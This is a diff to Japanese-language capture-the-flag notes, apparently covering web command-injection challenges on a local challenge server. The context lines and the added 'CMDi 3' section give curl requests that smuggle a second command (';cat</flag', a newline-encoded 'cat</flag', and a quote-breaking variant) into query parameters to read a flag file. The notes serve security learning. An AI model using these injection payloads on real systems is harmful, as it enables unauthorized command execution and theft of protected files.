@@ -157,3 +157,12 @@ curl "http://challenge.localhost:80/resource?dir=;cat</flag"
 #+begin_src shell
 curl "http://challenge.localhost/event?top-path=%0acat</flag"
 #+end_src
+* CMDi 3
+~ls -l~ には、 ~''~ があるので、なにかしらの引数を与えないとエラーになる。
+そこで、現在のディレクトリを表す ~.~ などを指定して、いったん ~'~ で閉じる。
+今回は ~;~ の使用は制限されていないので、その後に続けて、フラグを覗くコマンドを与える。
+なお、最後の ~'~ を閉じる必要があるので、忘れずに行う。
+
+#+begin_src shell
+curl "http://challenge.localhost/test?filedir=.';cat</flag'"
+#+end_src
